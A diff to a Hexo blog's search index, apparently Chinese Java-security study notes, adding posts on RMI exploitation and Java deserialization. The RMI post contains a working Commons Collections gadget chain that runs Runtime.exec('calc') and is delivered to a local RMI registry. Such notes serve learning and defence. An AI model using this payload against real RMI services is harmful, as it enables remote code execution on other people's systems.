@@ -113,14 +113,15 @@
 <p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516112826908.png" alt="image-20240516112826908"></p>
 <p><code>getMethod()</code>通常和<code>invoke()</code>搭配，<code>invoke()</code>可以动态地在运行时调用对象的方法。其实也不难理解，我们通过<code>getMethod()</code>反射获得一个方法后，肯定需要指定是哪个类，并且指明执行的参数。</p>
 <p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516131226025.png" alt="image-20240516131226025"></p>
-<p>用<code>getMethod()</code>调用一下Test类中的**Hello()**方法，可以发现它调用的是无参的方法，和实例化对象的情况类似，报错了，需要指明它的类型，否则调用无参的方法。</p>
+<p>用<code>getMethod()</code>调用一下Test类中的<code>Hello()</code>方法，可以发现它调用的是无参的方法，和实例化对象的情况类似，报错了，需要指明它的类型，否则调用无参的方法。</p>
 <p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516130413038.png" alt="image-20240516130413038"></p>
 <p>(Class类中的<code>getMethod()</code>方法)</p>
 <p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516113750554.png" alt="image-20240516113750554"></p>
 <p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516130817172.png" alt="image-20240516130817172"></p>
 <h2 id="小练习，反射弹计算器"><a href="#小练习，反射弹计算器" class="headerlink" title="小练习，反射弹计算器"></a>小练习，反射弹计算器</h2><p>正常情况下咱们弹计算器<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516133359336.png" alt="image-20240516133359336"></p>
+<p>反射写法</p>
 <p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516141618708.png" alt="image-20240516141618708"></p>
-<p>因为 <code>getRuntime()</code>是静态方法，属于类，所有**getRuntime.invoke();**不需要指定对象。</p>
+<p>因为 <code>getRuntime()</code>是静态方法，属于类，所以<code>getRuntime.invoke()</code>;不需要指定对象。</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用 getRuntime 方法，获得 Runtime 类的实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240516143222774.png" alt="image-20240516143222774"></p>
@@ -250,6 +251,71 @@
       </categories>
       <tags>
         <tag>JAVA设计模式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RMI漏洞利用</title>
+    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/RMI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>强烈建议大家在学习之前先去b站看组长的视频了解rmi的通信原理。</p>
+<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
+<hr>
+<p>RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大。对于初学者来说也会偏难，慢慢磨吧。雷军在一次演讲中说到:很多知识点没有绝对的先后顺序，看不懂的先跳过去。</p>
+<p>个人感悟：确实很多东西你先过几遍，实在不懂就跳过去，慢慢就懂了，唯一需要的是坚持。</p>
+<h2 id="攻击点总结"><a href="#攻击点总结" class="headerlink" title="攻击点总结"></a>攻击点总结</h2><p>在看完组长的视频之后对攻击点总结</p>
+<p>一个远程对象的 <code>LiveRef</code> 在整个生命周期内是唯一的，保证了对象引用的一致性。</p>
+<h2 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h2><p>添加Commons Collections</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.SayHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        remoteObj.SayGoodbye(getpayload());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;lala&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(java.lang.annotation.Retention.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
+<p><a href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深</a></p>
+<p><a href="https://xz.aliyun.com/t/7930?time__1311=n4+xnD0G0=eQqiIPAKDsA3ExjxtvdiYDgiGYD&alichlgref=https://xz.aliyun.com/u/20851">针对RMI服务的九重攻击 - 上</a></p>
+<p><a href="https://xz.aliyun.com/t/7932?time__1311=n4+xnD0G0=eQqiIpq05+b8DkGG8SdKt8DgiYD&alichlgref=https://xz.aliyun.com/u/20851">针对RMI服务的九重攻击 - 下</a></p>
+<p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">Java反序列化之RMI专题02-RMI的几种攻击方式</a></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>JAVA安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA反序列化</title>
+    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="为什么JAVA需要反序列化"><a href="#为什么JAVA需要反序列化" class="headerlink" title="为什么JAVA需要反序列化"></a>为什么JAVA需要反序列化</h2><p><strong>1. 数据持久化</strong></p>
+<p>序列化可以将 Java 对象转换为字节序列，并将其存储到文件中或数据库中，该字节包含对象的数据、对象的类型、对象的存储属性。这使得 Java 程序可以很容易地保存和加载数据，而无需每次都重新创建对象。例如，一个 Java 应用程序可以将用户数据序列化到文件中，以便在下次启动时加载。</p>
+<p><strong>2. 远程通信</strong></p>
+<p>序列化还可以用于在网络上传输 Java 对象。例如，一个 Java 应用程序可以将一个对象序列化并发送给另一个应用程序，或者将一个对象从客户端发送到服务器。这使得 Java 程序可以很容易地在不同的机器之间共享数据。</p>
+<h2 id="序列化与反序列化的实现"><a href="#序列化与反序列化的实现" class="headerlink" title="序列化与反序列化的实现"></a>序列化与反序列化的实现</h2><p>序列化对象会通过<code>ObjectOutputStream</code>的<code>writeObject</code>方法将一个对象写入到文件中。</p>
+<p>而反序列化是使用了<code>ObjectOutputStream类</code>的<code>readObject</code> 方法进行读取并还原成在序列化前的一个类。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>定义了一个Person类，实现了<strong>Serializable</strong>接口，有两个属性和一个构造方法，重写了<code>toString()</code></p>
+<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135149134.png" alt="image-20240521135149134"></p>
+<p>可以看到<strong>Serializable</strong>是空接口，可以理解为是一个标记，实现了它才能序列。</p>
+<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135203323.png" alt="image-20240521135203323"></p>
+<p>定义了一个serialize静态方法</p>
+<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135344209.png" alt="image-20240521135344209"></p>
+<p>序列化的结果</p>
+<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135254681.png" alt="image-20240521135254681"></p>
+<p>反序列化：还原成在序列化前的一个类。</p>
+<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135403252.png" alt="image-20240521135403252"></p>
+<h2 id="为什么会产生安全问题"><a href="#为什么会产生安全问题" class="headerlink" title="为什么会产生安全问题"></a>为什么会产生安全问题</h2><p>只要序列化一个数据，上传到服务器，如果服务器反序列化了，那其中的代码一定会执行，给予了攻击者在服务器执行代码的能力。</p>
+<h2 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h2><p>怎么算是一个好的入口类？实现了<code>Serializable</code>接口,重写了readObject，参数类型宽泛，最好JDK自带。</p>
+<p>这样我们很容易就会想到Map，HashMap实现了<strong>Serializable</strong>接口，重写了<code>readObject()</code>方法。（在类里面重写了readObject方法，JDK会自动调用重写的readObject方法）<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521141902419.png" alt="image-20240521141902419"></p>
+<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521142108326.png" alt="image-20240521142108326"></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>JAVA安全</tag>
       </tags>
   </entry>
 </search>
